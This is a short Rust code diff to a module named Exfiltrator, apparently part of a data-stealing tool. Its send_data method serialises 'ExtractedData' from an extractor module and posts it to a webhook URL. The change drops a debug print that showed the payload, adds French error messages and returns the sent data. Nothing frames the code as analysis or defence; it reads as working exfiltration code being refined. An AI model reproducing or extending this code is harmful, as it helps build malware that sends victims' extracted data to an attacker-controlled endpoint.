@@ -1,5 +1,6 @@
 use reqwest::Client;
 use crate::extractor::ExtractedData;
+use serde_json::Value;
 
 pub struct Exfiltrator {
     webhook_url: String,
@@ -13,25 +14,20 @@ impl Exfiltrator {
             client: Client::new(),
         }
     }
-    pub async fn send_data(&self, data: &ExtractedData) -> Result<(), String> {
-        let payload_value = serde_json::to_value(data)
+
+    pub async fn send_data(&self, data: &ExtractedData) -> Result<Value, String> {
+        let payload = serde_json::to_value(data)
             .map_err(|e| format!("Erreur de sérialisation JSON : {}", e))?;
-
-
-        println!("DEBUG ▶️ Envoi vers {} :\n{}", self.webhook_url,
-            serde_json::to_string_pretty(&payload_value)
-                .unwrap_or_else(|_| "<impossible de formater>".into())
-        );
 
         let resp = self.client
             .post(&self.webhook_url)
-            .json(&payload_value)
+            .json(&payload)
             .send()
             .await
-            .map_err(|e| e.to_string())?;
+            .map_err(|e| format!("Erreur réseau lors de l'envoi : {}", e))?;
 
         if resp.status().is_success() {
-            Ok(())
+            Ok(payload)
         } else {
             Err(format!("Échec (HTTP {}).", resp.status()))
         }
